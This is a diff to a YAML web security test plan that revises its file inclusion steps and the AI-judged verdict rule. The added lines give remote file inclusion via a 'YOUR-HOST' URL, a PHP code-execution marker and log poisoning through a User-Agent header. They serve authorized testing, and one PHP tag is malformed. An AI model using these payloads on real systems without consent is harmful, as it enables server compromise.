@@ -37,19 +37,29 @@ steps:
       known file's content (see the excerpt). Collect it with the owner's agreement: it
       can trip a WAF and fill error logs.
     load_note: About ten payloads per file-naming parameter (heavy). WSTG_PAUSE slows it down.
-  - summary: Check for file inclusion that runs the file (manual)
+  - summary: Confirm remote or log-based file inclusion (manual, only if needed)
     evidence: [traversal-tests, traversal-probe]
     operation: >-
-      Where a parameter selects a page or template, try to include a configuration file
-      or source file, and (only with the owner's agreement) a file that would prove code
-      execution. Note whether the include runs or merely displays the file. Add the result
-      to traversal-tests.
+      The probe (step 2) already tests local inclusion and code execution: a
+      `CODE EXECUTION` line is a fail, a base64 "source disclosure" line reads source.
+      Do this step only for what it cannot do, and only with the owner's agreement:
+      (1) Remote file inclusion: for a parameter that takes a URL or path, host a text file
+      on a server you control and point the parameter at it, for example
+      `{base_url}/page?file=http://YOUR-HOST/probe.txt`; if its content appears, inclusion
+      is remote (put `<?php echo 31337*31337;>` in the file and look for `982007569` to show
+      it runs).
+      (2) Log/session poisoning: if only local files include, send a request whose
+      User-Agent is `<?php echo 31337*31337;?>`, then include the web server log
+      (for example `.../access.log`) through the parameter and look for `982007569`.
+      (3) Write each payload and result in traversal-tests. Skip this step when step 2
+      already shows a fail.
   - summary: Judge directory traversal and file inclusion
     evidence: [traversal-tests, katana-crawl]
     ai_task: >-
       From the traversal-probe output (step 2) and traversal-tests (step 3) decide whether any file parameter reads or includes an
       out-of-scope file. Verdict: fail when a traversal sequence, absolute path, encoded
-      variant, or inclusion payload returned an out-of-directory file or executed one;
+      variant, or inclusion payload returned an out-of-directory file, or a data:// / remote
+      / log-poisoning inclusion ran code (a probe "CODE EXECUTION" line);
       pass when every parameter normalised or refused the reference; "-" when
       traversal-probe is missing. Report a traversal and a code-executing inclusion
       separately.
